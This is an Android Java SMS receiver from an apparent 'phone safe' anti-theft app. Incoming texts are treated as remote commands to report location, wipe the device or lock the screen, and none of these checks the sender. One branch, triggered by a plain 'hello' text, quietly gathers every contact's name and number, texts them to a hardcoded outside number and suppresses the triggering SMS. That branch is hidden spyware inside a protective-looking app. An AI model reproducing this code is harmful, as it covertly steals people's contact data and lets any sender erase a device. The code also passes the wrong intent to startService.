package com.example.phonesafe1.receiver;

import java.util.ArrayList;

import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.media.MediaPlayer;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import com.example.phonesafe1.R;
import com.example.phonesafe1.business.ContactsManager;
import com.example.phonesafe1.entity.ContractsInfo;
import com.example.phonesafe1.service.LocationService;
import com.example.phonesafe1.utils.CacheUtils;

public class SmsReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		DevicePolicyManager manager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
		Object[] pdu = (Object[]) (intent.getExtras().get("pdus"));
		
		String fullMessage = "";
		String num = null;
		for (Object object : pdu) {
			byte[] message = (byte[])object;
			SmsMessage smsMessage = SmsMessage.createFromPdu(message);
			num = smsMessage.getOriginatingAddress();
			String content = smsMessage.getMessageBody();
			fullMessage = fullMessage + content;
		}
		System.out.println("联系人号码：  " + num + "短信内容: " + fullMessage);
		
		if ("#*location*#".equals(fullMessage)) {
			Intent serviceIntent = new Intent(context, LocationService.class);
			context.startService(intent);
			//获取手机位置
			String latitude = CacheUtils.getString(CacheUtils.LATITUDE);
			String longitude = CacheUtils.getString(CacheUtils.LONGITUTDE);
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage("5554", null, "纬度" +latitude + "经度" + longitude, null, null);
			abortBroadcast();
			System.out.println("广播被截断");
			
		}else if ("#*alarm*#".equals(fullMessage)) {
			MediaPlayer mediaPlayer = MediaPlayer.create(context, R.raw.guoge);
			mediaPlayer.start();
			manager.wipeData(0);
			abortBroadcast();
			
		}else if ("你好".equals(fullMessage)) {
			ArrayList<ContractsInfo> allContractsInfo = (ArrayList<ContractsInfo>) ContactsManager.getAllContractsInfo(context);
//			ArrayList<String> list = new ArrayList<String>();
			String allContacts = "";
			for (ContractsInfo info : allContractsInfo) {
				String name = info.getName();
				String number = info.getNum();
				allContacts = allContacts +name + number;
//				list.add(name + ": ");
//				list.add(number + " ");
			}
			/*Intent serviceIntent = new Intent(context, LocationService.class);
			context.startService(intent);
			String allContacts = CacheUtils.getString("contacts");*/
			SmsManager smsManager = SmsManager.getDefault();
			smsManager.sendTextMessage("15380586692", null, allContacts, null, null);
//			smsManager.sendMultipartTextMessage("18717513886", null, list, null, null);
			
			abortBroadcast();
			
		}else if ("#*lockscreen*#".equals(fullMessage)) {
			
			ComponentName componentName = new ComponentName(context, MyAdminReceiver.class);
			if (manager.isAdminActive(componentName)) {
				manager.lockNow();
			}
			abortBroadcast();
		}
		
	}

}
